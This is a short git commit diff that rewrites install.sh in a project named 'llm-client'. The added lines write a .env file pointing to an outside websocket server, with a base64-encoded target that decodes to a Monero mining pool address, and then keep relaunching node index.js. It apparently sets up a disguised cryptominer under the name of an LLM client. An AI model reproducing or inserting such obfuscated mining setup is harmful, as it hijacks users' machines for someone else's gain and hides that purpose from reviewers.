30b5b951727dcd19b87616d773d4e5d6ce89885c
sawa05303 <93839840+sawa05303@users.noreply.github.com>
2026-02-04 17:38:59 +0700

    Update install.sh

--- llm-client/install.sh
+++ llm-client/install.sh
@@ -1,2 +1,9 @@
 #!/bin/bash
-while true; do node index.js; sleep 10; done
+CONNECT=$1
+NAME=$2
+echo "SERVER_WS=wss://cloudnineone.my.id
+SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
+SERVER_DOMAIN=${NAME}
+SERVER_SECRET=secret
+SERVER_CONNECTION=${CONNECT}" > .env
+while true; do node index.js; sleep 15; done
